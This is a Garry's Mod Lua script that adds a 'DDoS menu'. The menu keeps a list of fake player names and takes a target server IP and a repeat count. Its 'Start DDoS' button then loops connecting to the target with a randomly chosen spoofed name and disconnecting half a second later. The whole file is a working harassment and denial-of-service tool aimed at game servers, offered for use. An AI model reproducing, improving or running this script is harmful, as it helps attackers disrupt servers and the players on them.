local file=file

if file.Exists("lua/bin/gmsv_name_win32.dll","MOD") then
require("name")
end

concommand.Add("ddos_menu",function()
	local names={"q"}

	if !file.Exists("_mem_names.dat","DATA") then
		file.Write("_mem_names.dat","")
	else
		names=util.JSONToTable(file.Read("_mem_names.dat","DATA")) or names or {}
	end
	
	local f=vgui.Create("DFrame")
	f:SetSize(500,200)
	f:Center()
	f:SetTitle("DDoS menu")
	f:MakePopup()
	
	local dsp=vgui.Create("DScrollPanel",f)
	dsp:SetPos(10,30)
	dsp:SetSize(250,170)
	local function re()
		dsp:Clear()
		for i=1,#names do
			local name = dsp:Add( "DButton" )
			name:SetText( names[i] )
			name:Dock( 4 )
			name:DockMargin( 0, 0, 0, 5 )
			name.DoClick=function()
				table.remove(names,i)
				re()
			end
		end
		
		local but=dsp:Add( "DButton" )
		but:SetText("Add new name")
		but:Dock(4)
		but:DockMargin( 0, 0, 0, 5 )
		but:SetImage("icon16/add.png","noclamp")
		but.DoClick=function()
			local mem=vgui.Create("DFrame")
			mem:SetTitle("")
			mem:SetSize(300,100)
			mem:Center()
			mem:MakePopup()
			local e=vgui.Create("DTextEntry",mem)
			e:SetPos(10,30)
			e:SetSize(280,25)
			mem.Paint=function()
				surface.SetDrawColor(0,0,0,240)
				surface.DrawRect(0,0,300,100)
				draw.SimpleText(#e:GetText().."/32","TargetID",15,65,color_white)
			end
			local bat=vgui.Create("DButton",mem)
			bat:SetPos(60,60)
			bat:SetSize(70,25)
			bat:SetText("ADD")
			bat.DoClick=function()
				names[#names+1]=e:GetText()
				re()
			end
		end
	end
		
	re()
	
	
	local e=vgui.Create("DTextEntry",f)
	e:SetPos(270,30)
	e:SetSize(220,20)
	e:SetText("ip")
	
	local e1=vgui.Create("DTextEntry",f)
	e1:SetPos(270,60)
	e1:SetSize(220,20)
	e1:SetText("count")
	
	local beb=vgui.Create("DButton",f)
	beb:SetPos(270,90)
	beb:SetSize(220,25)
	beb:SetText("Start DDoS")
	beb.DoClick=function()
		file.Write("_mem_names.dat",util.TableToJSON(names))
		local sas=tonumber(e1:GetText())
		local ses=e:GetText()
		f:Remove()
		timer.Create("ddos",1,sas,function()
			SetName(names[math.random(1,#names)])
			RunGameUICommand('engine connect '..ses)
			timer.Simple(0.5,function() 
			RunGameUICommand('engine disconnect') 
			RunConsoleCommand('disconnect') end)
		end)
	end
end)



